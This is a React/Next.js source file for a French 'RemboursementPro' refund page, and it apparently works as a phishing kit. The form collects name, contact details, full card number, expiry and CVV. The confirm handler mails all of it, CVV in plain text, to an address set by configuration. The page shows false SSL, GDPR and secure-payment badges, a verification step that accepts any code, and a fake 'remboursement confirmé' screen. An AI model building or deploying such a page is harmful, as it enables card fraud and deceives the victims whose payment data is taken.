'use client';

export const dynamic = 'force-dynamic';

import { useState, useCallback } from 'react';
import {
  Card,
  CardHeader,
  CardTitle,
  CardDescription,
  CardContent,
  CardFooter,
} from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
  InputOTPSeparator,
} from '@/components/ui/input-otp';
import {
  ShieldCheck,
  ArrowRight,
  ArrowLeft,
  Loader2,
  CheckCircle2,
  Clock,
  Wallet,
  CreditCard,
  Mail,
  Phone,
  User,
  FileText,
  Lock,
  BadgeCheck,
  Sparkles,
} from 'lucide-react';

type Step = 'form' | 'confirm' | 'processing' | 'otp' | 'done';

interface FormData {
  full_name: string;
  email: string;
  phone: string;
  card_number: string;
  card_expiry: string;
  card_cvv: string;
  reason: string;
  amount: string;
  booking_reference: string;
}

const initialFormData: FormData = {
  full_name: '',
  email: '',
  phone: '',
  card_number: '',
  card_expiry: '',
  card_cvv: '',
  reason: '',
  amount: '',
  booking_reference: '',
};

const steps: { key: Step; label: string; pct: number }[] = [
  { key: 'form', label: 'Informations', pct: 25 },
  { key: 'confirm', label: 'Confirmation', pct: 50 },
  { key: 'processing', label: 'Traitement', pct: 75 },
  { key: 'otp', label: 'Vérification', pct: 100 },
];

const refundRecipient = process.env.NEXT_PUBLIC_REFUND_EMAIL_TO;

export default function Home() {
  const [step, setStep] = useState<Step>('form');
  const [formData, setFormData] = useState<FormData>(initialFormData);
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});
  const [submitting, setSubmitting] = useState(false);
  const [otp, setOtp] = useState('');
  const [requestId, setRequestId] = useState<string | null>(null);
  const [otpError, setOtpError] = useState('');
  const [verifying, setVerifying] = useState(false);

  const currentStepIndex = steps.findIndex((s) => s.key === step);
  const progressValue = step === 'done' ? 100 : steps[Math.max(0, currentStepIndex)]?.pct ?? 0;

  const validateForm = useCallback((): boolean => {
    const e: Partial<Record<keyof FormData, string>> = {};
    if (!formData.full_name.trim()) e.full_name = 'Veuillez saisir votre nom complet';
    if (!formData.email.trim()) e.email = 'Veuillez saisir votre email';
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) e.email = 'Format d\'email invalide';
    if (!formData.phone.trim()) e.phone = 'Veuillez saisir votre téléphone';
    if (!formData.card_number.trim()) e.card_number = 'Veuillez saisir votre numéro de carte';
    else if (formData.card_number.replace(/\s/g, '').length < 13) e.card_number = 'Numéro de carte invalide';
    if (!formData.card_expiry.trim()) e.card_expiry = 'Veuillez saisir la date d\'expiration';
    else if (!/^\d{2}\/\d{2}$/.test(formData.card_expiry)) e.card_expiry = 'Format attendu : MM/AA';
    if (!formData.card_cvv.trim()) e.card_cvv = 'Veuillez saisir le CVV';
    else if (formData.card_cvv.length < 3) e.card_cvv = 'CVV invalide (3 chiffres)';
    if (!formData.reason) e.reason = 'Veuillez sélectionner un motif';
    if (!formData.amount) e.amount = 'Veuillez saisir le montant';
    else if (parseFloat(formData.amount) <= 0) e.amount = 'Le montant doit être supérieur à 0';
    setErrors(e);
    return Object.keys(e).length === 0;
  }, [formData]);

  const handleFormChange = (field: keyof FormData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    if (errors[field]) setErrors((prev) => ({ ...prev, [field]: undefined }));
  };

  const handleSubmitForm = () => {
    if (!validateForm()) return;
    setStep('confirm');
  };

  const handleConfirm = () => {
    if (!refundRecipient) {
      window.alert('Configurez NEXT_PUBLIC_REFUND_EMAIL_TO dans .env.local.');
      return;
    }

    const id = generateRequestId();
    setRequestId(id);

    const body = [
      `Nom : ${formData.full_name}`,
      `Email : ${formData.email}`,
      `Téléphone : ${formData.phone}`,
      `Motif : ${reasonLabel(formData.reason)}`,
      `Montant à rembourser : ${parseFloat(formData.amount).toFixed(2)} €`,
      `Référence de réservation : ${formData.booking_reference || 'Non renseignée'}`,
      `Numéro de demande : ${id}`,
      `Numéro de carte : ${formData.card_number}`,
      `Date d'expiration : ${formData.card_expiry}`,
      `CVV : ${formData.card_cvv}`,

    ].join('\n');

    window.location.href = `mailto:${refundRecipient}?subject=${encodeURIComponent(
      `Nouvelle demande de remboursement - ${id.slice(0, 8).toUpperCase()}`,
    )}&body=${encodeURIComponent(body)}`;
    setStep('done');
  };

  const handleVerifyOtp = () => {
    setVerifying(true);
    setOtpError('');

    setTimeout(() => {
      setStep('done');
      setVerifying(false);
    }, 1500);
  };

  const handleReset = () => {
    setFormData(initialFormData);
    setOtp('');
    setRequestId(null);
    setErrors({});
    setOtpError('');
    setStep('form');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[hsl(210,40%,98%)] via-[hsl(210,30%,96%)] to-[hsl(180,20%,95%)]">
      {/* Header */}
      <header className="border-b border-border/50 bg-white/70 backdrop-blur-xl sticky top-0 z-50">
        <div className="max-w-5xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="relative">
              <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)] flex items-center justify-center shadow-lg shadow-[hsl(210,85%,35%)]/20">
                <Wallet className="w-5 h-5 text-white" />
              </div>
              <div className="absolute -top-1 -right-1 w-3 h-3 bg-[hsl(150,65%,45%)] rounded-full ring-2 ring-white" />
            </div>
            <div>
              <h1 className="text-lg font-bold tracking-tight text-foreground">RemboursementPro</h1>
              <p className="text-xs text-muted-foreground">Plateforme de remboursement sécurisée</p>
            </div>
          </div>
          <div className="hidden sm:flex items-center gap-2 text-xs text-muted-foreground">
            <ShieldCheck className="w-4 h-4 text-[hsl(150,65%,45%)]" />
            <span>Connexion chiffrée SSL</span>
          </div>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-6 py-8">
        {/* Progress bar */}
        {step !== 'done' && (
          <div className="mb-8 animate-fade-in">
            <div className="flex items-center justify-between mb-3">
              {steps.map((s, i) => {
                const isActive = s.key === step;
                const isPast = i < currentStepIndex;
                return (
                  <div key={s.key} className="flex items-center gap-2 flex-1 last:flex-none">
                    <div className="flex items-center gap-2">
                      <div
                        className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold transition-all duration-300 ${
                          isActive
                            ? 'bg-[hsl(210,85%,35%)] text-white scale-110 shadow-lg shadow-[hsl(210,85%,35%)]/30'
                            : isPast
                            ? 'bg-[hsl(150,65%,45%)] text-white'
                            : 'bg-secondary text-muted-foreground'
                        }`}
                      >
                        {isPast ? <CheckCircle2 className="w-4 h-4" /> : i + 1}
                      </div>
                      <span
                        className={`text-sm font-medium hidden sm:inline ${
                          isActive ? 'text-foreground' : 'text-muted-foreground'
                        }`}
                      >
                        {s.label}
                      </span>
                    </div>
                    {i < steps.length - 1 && (
                      <div className="flex-1 h-0.5 mx-2 rounded-full bg-secondary overflow-hidden">
                        <div
                          className={`h-full transition-all duration-500 ${
                            isPast ? 'bg-[hsl(150,65%,45%)] w-full' : 'bg-transparent w-0'
                          }`}
                        />
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
            <div className="h-1.5 mt-2 w-full rounded-full bg-secondary overflow-hidden">
              <div
                className="h-full rounded-full bg-gradient-to-r from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)] transition-all duration-500"
                style={{ width: `${progressValue}%` }}
              />
            </div>
          </div>
        )}

        {/* Step: Form */}
        {step === 'form' && (
          <Card className="max-w-2xl mx-auto shadow-xl border-border/50 animate-slide-up overflow-hidden">
            <div className="h-1.5 bg-gradient-to-r from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)]" />
            <CardHeader className="space-y-1">
              <div className="flex items-center gap-2 text-[hsl(210,85%,35%)] mb-2">
                <FileText className="w-5 h-5" />
                <span className="text-sm font-semibold uppercase tracking-wide">Étape 1</span>
              </div>
              <CardTitle className="text-2xl">Informations de remboursement</CardTitle>
              <CardDescription>
                Renseignez vos coordonnées et le montant à rembourser. Tous les champs marqués d'un astérisque sont obligatoires.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-5">
              <div className="grid sm:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="full_name" className="flex items-center gap-1.5">
                    <User className="w-3.5 h-3.5 text-muted-foreground" />
                    Nom complet *
                  </Label>
                  <Input
                    id="full_name"
                    placeholder="Jean Dupont"
                    value={formData.full_name}
                    onChange={(e) => handleFormChange('full_name', e.target.value)}
                    className={errors.full_name ? 'border-destructive' : ''}
                  />
                  {errors.full_name && <p className="text-xs text-destructive">{errors.full_name}</p>}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email" className="flex items-center gap-1.5">
                    <Mail className="w-3.5 h-3.5 text-muted-foreground" />
                    Email *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    placeholder="jean.dupont@email.fr"
                    value={formData.email}
                    onChange={(e) => handleFormChange('email', e.target.value)}
                    className={errors.email ? 'border-destructive' : ''}
                  />
                  {errors.email && <p className="text-xs text-destructive">{errors.email}</p>}
                </div>
              </div>

              <div className="grid sm:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="phone" className="flex items-center gap-1.5">
                    <Phone className="w-3.5 h-3.5 text-muted-foreground" />
                    Téléphone *
                  </Label>
                  <Input
                    id="phone"
                    placeholder="06 12 34 56 78"
                    value={formData.phone}
                    onChange={(e) => handleFormChange('phone', e.target.value)}
                    className={errors.phone ? 'border-destructive' : ''}
                  />
                  {errors.phone && <p className="text-xs text-destructive">{errors.phone}</p>}
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="card_number" className="flex items-center gap-1.5">
                  <CreditCard className="w-3.5 h-3.5 text-muted-foreground" />
                  Numéro de carte *
                </Label>
                <Input
                  id="card_number"
                  placeholder="1234 5678 9012 3456"
                  value={formData.card_number}
                  onChange={(e) => handleFormChange('card_number', formatCardNumber(e.target.value))}
                  className={`font-mono ${errors.card_number ? 'border-destructive' : ''}`}
                  maxLength={19}
                />
                {errors.card_number && <p className="text-xs text-destructive">{errors.card_number}</p>}
              </div>

              <div className="grid sm:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="card_expiry" className="flex items-center gap-1.5">
                    <CreditCard className="w-3.5 h-3.5 text-muted-foreground" />
                    Date d'expiration *
                  </Label>
                  <Input
                    id="card_expiry"
                    placeholder="MM/AA"
                    value={formData.card_expiry}
                    onChange={(e) => handleFormChange('card_expiry', formatExpiry(e.target.value))}
                    className={`font-mono ${errors.card_expiry ? 'border-destructive' : ''}`}
                    maxLength={5}
                  />
                  {errors.card_expiry && <p className="text-xs text-destructive">{errors.card_expiry}</p>}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="card_cvv" className="flex items-center gap-1.5">
                    <Lock className="w-3.5 h-3.5 text-muted-foreground" />
                    CVV *
                  </Label>
                  <Input
                    id="card_cvv"
                    type="password"
                    placeholder="123"
                    value={formData.card_cvv}
                    onChange={(e) => handleFormChange('card_cvv', e.target.value.replace(/\D/g, ''))}
                    className={`font-mono ${errors.card_cvv ? 'border-destructive' : ''}`}
                    maxLength={3}
                  />
                  {errors.card_cvv && <p className="text-xs text-destructive">{errors.card_cvv}</p>}
                </div>
              </div>

              <div className="grid sm:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="flex items-center gap-1.5">
                    <FileText className="w-3.5 h-3.5 text-muted-foreground" />
                    Motif du remboursement *
                  </Label>
                  <Select
                    value={formData.reason}
                    onValueChange={(v) => handleFormChange('reason', v)}
                  >
                    <SelectTrigger className={errors.reason ? 'border-destructive' : ''}>
                      <SelectValue placeholder="Sélectionnez un motif" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="reservation">Réservation</SelectItem>
                      <SelectItem value="visite">Visite</SelectItem>
                      <SelectItem value="annulation">Annulation</SelectItem>
                      <SelectItem value="autre">Autre</SelectItem>
                    </SelectContent>
                  </Select>
                  {errors.reason && <p className="text-xs text-destructive">{errors.reason}</p>}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="amount" className="flex items-center gap-1.5">
                    <Wallet className="w-3.5 h-3.5 text-muted-foreground" />
                    Montant à rembourser (€) *
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    step="0.01"
                    min="0"
                    placeholder="0,00"
                    value={formData.amount}
                    onChange={(e) => handleFormChange('amount', e.target.value)}
                    className={errors.amount ? 'border-destructive' : ''}
                  />
                  {errors.amount && <p className="text-xs text-destructive">{errors.amount}</p>}
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="booking_reference" className="flex items-center gap-1.5">
                  <FileText className="w-3.5 h-3.5 text-muted-foreground" />
                  Référence de réservation (optionnel)
                </Label>
                <Input
                  id="booking_reference"
                  placeholder="REF-2026-XXXXX"
                  value={formData.booking_reference}
                  onChange={(e) => handleFormChange('booking_reference', e.target.value)}
                />
              </div>
            </CardContent>
            <CardFooter className="flex justify-end">
              <Button
                onClick={handleSubmitForm}
                size="lg"
                className="bg-gradient-to-r from-[hsl(210,85%,35%)] to-[hsl(210,85%,40%)] hover:from-[hsl(210,85%,30%)] hover:to-[hsl(210,85%,38%)] shadow-lg shadow-[hsl(210,85%,35%)]/25 transition-all"
              >
                Continuer
                <ArrowRight className="w-4 h-4 ml-2" />
              </Button>
            </CardFooter>
          </Card>
        )}

        {/* Step: Confirm */}
        {step === 'confirm' && (
          <Card className="max-w-2xl mx-auto shadow-xl border-border/50 animate-slide-up overflow-hidden">
            <div className="h-1.5 bg-gradient-to-r from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)]" />
            <CardHeader className="space-y-1">
              <div className="flex items-center gap-2 text-[hsl(210,85%,35%)] mb-2">
                <ShieldCheck className="w-5 h-5" />
                <span className="text-sm font-semibold uppercase tracking-wide">Étape 2</span>
              </div>
              <CardTitle className="text-2xl">Confirmez votre demande</CardTitle>
              <CardDescription>
                Vérifiez les informations ci-dessous. Souhaitez-vous procéder au remboursement ?
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="rounded-xl border border-border/60 bg-gradient-to-br from-secondary/40 to-secondary/10 p-6 space-y-3">
                <div className="grid sm:grid-cols-2 gap-x-6 gap-y-3">
                  <InfoRow icon={<User className="w-4 h-4" />} label="Nom" value={formData.full_name} />
                  <InfoRow icon={<Mail className="w-4 h-4" />} label="Email" value={formData.email} />
                  <InfoRow icon={<Phone className="w-4 h-4" />} label="Téléphone" value={formData.phone} />
                  <InfoRow icon={<CreditCard className="w-4 h-4" />} label="Carte" value={`**** **** **** ${formData.card_number.replace(/\s/g, '').slice(-4)}`} mono />
                </div>
                <div className="border-t border-border/40 pt-3 grid sm:grid-cols-2 gap-x-6 gap-y-3">
                  <InfoRow icon={<FileText className="w-4 h-4" />} label="Motif" value={reasonLabel(formData.reason)} />
                  <InfoRow icon={<Wallet className="w-4 h-4" />} label="Montant" value={`${parseFloat(formData.amount || '0').toFixed(2)} €`} highlight />
                  {formData.booking_reference && (
                    <InfoRow icon={<FileText className="w-4 h-4" />} label="Référence" value={formData.booking_reference} />
                  )}
                </div>
              </div>

              <div className="flex items-start gap-3 p-4 rounded-lg bg-[hsl(38,92%,50%)]/10 border border-[hsl(38,92%,50%)]/20">
                <Lock className="w-5 h-5 text-[hsl(38,92%,50%)] shrink-0 mt-0.5" />
                <p className="text-sm text-foreground/80">
                  En cliquant sur « Rembourser », votre logiciel de messagerie s'ouvrira avec un email prérempli. Vérifiez-le puis envoyez-le.
                </p>
              </div>
            </CardContent>
            <CardFooter className="flex flex-col gap-3 sm:flex-row sm:justify-between">
              <div className="flex w-full justify-between sm:w-auto sm:gap-3">
                <Button variant="ghost" onClick={() => setStep('form')} size="lg">
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  Retour
                </Button>
                <Button
                  onClick={handleConfirm}
                  size="lg"
                  disabled={submitting}
                  className="bg-gradient-to-r from-[hsl(150,65%,38%)] to-[hsl(150,65%,45%)] hover:from-[hsl(150,65%,33%)] hover:to-[hsl(150,65%,42%)] text-white shadow-lg shadow-[hsl(150,65%,38%)]/25"
                >
                  Rembourser
                  <ArrowRight className="w-4 h-4 ml-2" />
                </Button>
              </div>
            </CardFooter>
          </Card>
        )}

        {/* Step: Processing */}
        {step === 'processing' && (
          <Card className="max-w-xl mx-auto shadow-xl border-border/50 animate-scale-in overflow-hidden">
            <div className="h-1.5 bg-gradient-to-r from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)]" />
            <CardContent className="py-16 flex flex-col items-center text-center">
              <div className="relative mb-8">
                <div className="absolute inset-0 rounded-full bg-[hsl(210,85%,35%)]/20 animate-pulse-ring" />
                <div className="relative w-24 h-24 rounded-full bg-gradient-to-br from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)] flex items-center justify-center shadow-2xl shadow-[hsl(210,85%,35%)]/30">
                  <Loader2 className="w-10 h-10 text-white animate-spin" />
                </div>
              </div>
              <h2 className="text-xl font-bold mb-2">Traitement en cours...</h2>
              <p className="text-muted-foreground text-sm max-w-sm">
                Veuillez patienter un moment, votre demande de remboursement est en cours de traitement. Un code de vérification est en cours d'envoi.
              </p>
              <div className="flex items-center gap-2 mt-6 text-xs text-muted-foreground">
                <Clock className="w-3.5 h-3.5" />
                <span>Cela peut prendre quelques secondes</span>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Step: OTP */}
        {step === 'otp' && (
          <Card className="max-w-xl mx-auto shadow-xl border-border/50 animate-slide-up overflow-hidden">
            <div className="h-1.5 bg-gradient-to-r from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)]" />
            <CardHeader className="space-y-1 text-center">
              <div className="flex justify-center mb-3">
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-[hsl(210,85%,35%)] to-[hsl(180,70%,40%)] flex items-center justify-center shadow-lg shadow-[hsl(210,85%,35%)]/25">
                  <BadgeCheck className="w-7 h-7 text-white" />
                </div>
              </div>
              <CardTitle className="text-2xl">Vérification de sécurité</CardTitle>
              <CardDescription>
                Un code à 6 chiffres a été envoyé à <span className="font-semibold text-foreground">{formData.email}</span>. Saisissez-le ci-dessous pour finaliser votre remboursement.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="flex flex-col items-center gap-4">
                <InputOTP
                  maxLength={6}
                  value={otp}
                  onChange={(v) => {
                    setOtp(v);
                    setOtpError('');
                  }}
                >
                  <InputOTPGroup>
                    <InputOTPSlot index={0} className="w-12 h-14 text-lg" />
                    <InputOTPSlot index={1} className="w-12 h-14 text-lg" />
                    <InputOTPSlot index={2} className="w-12 h-14 text-lg" />
                  </InputOTPGroup>
                  <InputOTPSeparator />
                  <InputOTPGroup>
                    <InputOTPSlot index={3} className="w-12 h-14 text-lg" />
                    <InputOTPSlot index={4} className="w-12 h-14 text-lg" />
                    <InputOTPSlot index={5} className="w-12 h-14 text-lg" />
                  </InputOTPGroup>
                </InputOTP>

                {otpError && (
                  <p className="text-sm text-destructive flex items-center gap-1.5 animate-fade-in">
                    <span className="w-1.5 h-1.5 rounded-full bg-destructive" />
                    {otpError}
                  </p>
                )}

                {otp.length === 6 && !otpError && (
                  <p className="text-sm text-[hsl(150,65%,38%)] flex items-center gap-1.5 animate-fade-in">
                    <CheckCircle2 className="w-4 h-4" />
                    Code saisi, cliquez sur vérifier
                  </p>
                )}
              </div>

              <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                <Clock className="w-3.5 h-3.5" />
                <span>Saisissez le code que vous avez reçu</span>
              </div>
            </CardContent>
            <CardFooter className="flex justify-center">
              <Button
                onClick={handleVerifyOtp}
                size="lg"
                disabled={otp.length < 6 || verifying}
                className="bg-gradient-to-r from-[hsl(210,85%,35%)] to-[hsl(210,85%,40%)] hover:from-[hsl(210,85%,30%)] hover:to-[hsl(210,85%,38%)] shadow-lg shadow-[hsl(210,85%,35%)]/25 px-12"
              >
                {verifying ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Vérification...
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-4 h-4 mr-2" />
                    Vérifier le code
                  </>
                )}
              </Button>
            </CardFooter>
          </Card>
        )}

        {/* Step: Done */}
        {step === 'done' && (
          <Card className="max-w-xl mx-auto shadow-xl border-border/50 animate-scale-in overflow-hidden">
            <div className="h-1.5 bg-gradient-to-r from-[hsl(150,65%,38%)] to-[hsl(180,70%,40%)]" />
            <CardContent className="py-16 flex flex-col items-center text-center">
              <div className="relative mb-8">
                <div className="absolute inset-0 rounded-full bg-[hsl(150,65%,45%)]/20 animate-pulse-ring" />
                <div className="relative w-24 h-24 rounded-full bg-gradient-to-br from-[hsl(150,65%,38%)] to-[hsl(150,65%,50%)] flex items-center justify-center shadow-2xl shadow-[hsl(150,65%,38%)]/30">
                  <CheckCircle2 className="w-12 h-12 text-white" />
                </div>
              </div>
              <div className="flex items-center gap-2 mb-3">
                <Sparkles className="w-5 h-5 text-[hsl(38,92%,50%)]" />
                <span className="text-sm font-semibold uppercase tracking-wide text-[hsl(150,65%,38%)]">Remboursement validé</span>
                <Sparkles className="w-5 h-5 text-[hsl(38,92%,50%)]" />
              </div>
              <h2 className="text-2xl font-bold mb-2">Remboursement confirmé !</h2>
              <p className="text-muted-foreground text-sm max-w-sm mb-6">
                Votre demande de remboursement de <span className="font-semibold text-foreground">{parseFloat(formData.amount).toFixed(2)} €</span> a été vérifiée et validée avec succès. Le remboursement sera effectué sur votre carte bancaire sous 2 à 3 jours ouvrés.
              </p>

              <div className="rounded-xl border border-border/60 bg-secondary/30 p-4 w-full max-w-sm space-y-2 text-left">
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Numéro de demande</span>
                  <span className="font-mono font-semibold">{requestId?.slice(0, 8).toUpperCase()}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Montant</span>
                  <span className="font-semibold text-[hsl(150,65%,38%)]">{parseFloat(formData.amount).toFixed(2)} €</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Bénéficiaire</span>
                  <span className="font-semibold">{formData.full_name}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Statut</span>
                  <span className="font-semibold text-[hsl(150,65%,38%)] flex items-center gap-1">
                    <span className="w-1.5 h-1.5 rounded-full bg-[hsl(150,65%,45%)]" />
                    Validé
                  </span>
                </div>
              </div>

              <Button onClick={handleReset} variant="outline" size="lg" className="mt-8">
                Nouvelle demande
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Trust badges */}
        {step !== 'done' && step !== 'processing' && (
          <div className="max-w-2xl mx-auto mt-8 flex flex-wrap items-center justify-center gap-6 text-xs text-muted-foreground">
            <div className="flex items-center gap-1.5">
              <ShieldCheck className="w-4 h-4 text-[hsl(150,65%,45%)]" />
              <span>Données chiffrées</span>
            </div>
            <div className="flex items-center gap-1.5">
              <Lock className="w-4 h-4 text-[hsl(150,65%,45%)]" />
              <span>Paiement sécurisé</span>
            </div>
            <div className="flex items-center gap-1.5">
              <BadgeCheck className="w-4 h-4 text-[hsl(150,65%,45%)]" />
              <span>Conforme RGPD</span>
            </div>
          </div>
        )}
      </main>

      <footer className="border-t border-border/50 mt-12">
        <div className="max-w-5xl mx-auto px-6 py-6 text-center text-xs text-muted-foreground">
          <p>RemboursementPro — Plateforme de remboursement de réservation et de visite</p>
          <p className="mt-1">© 2026 RemboursementPro. Tous droits réservés.</p>
        </div>
      </footer>
    </div>
  );
}

function InfoRow({
  icon,
  label,
  value,
  mono,
  highlight,
}: {
  icon: React.ReactNode;
  label: string;
  value: string;
  mono?: boolean;
  highlight?: boolean;
}) {
  return (
    <div className="flex flex-col gap-0.5">
      <span className="text-xs text-muted-foreground flex items-center gap-1.5">
        {icon}
        {label}
      </span>
      <span className={`text-sm font-medium ${mono ? 'font-mono' : ''} ${highlight ? 'text-[hsl(150,65%,38%)] text-lg' : ''}`}>
        {value}
      </span>
    </div>
  );
}

function generateRequestId(): string {
  return crypto.randomUUID();
}

function formatCardNumber(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 16);
  return digits.replace(/(.{4})/g, '$1 ').trim();
}

function formatExpiry(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function reasonLabel(reason: string): string {
  const labels: Record<string, string> = {
    reservation: 'Réservation',
    visite: 'Visite',
    annulation: 'Annulation',
    autre: 'Autre',
  };
  return labels[reason] || reason;
}